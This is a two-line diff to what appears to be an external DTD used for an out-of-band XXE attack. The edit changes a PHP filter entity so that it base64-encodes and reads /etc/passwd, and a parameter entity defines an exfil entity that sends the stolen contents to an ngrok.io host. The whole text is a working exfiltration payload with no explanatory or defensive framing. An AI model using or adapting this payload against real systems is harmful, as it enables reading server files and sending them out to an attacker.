@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php:/filter/resource=index.php">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://f971-2001-b07-645a-f9d8-f98d-9338-ff91-b8f4.ngrok.io?%data;'>">
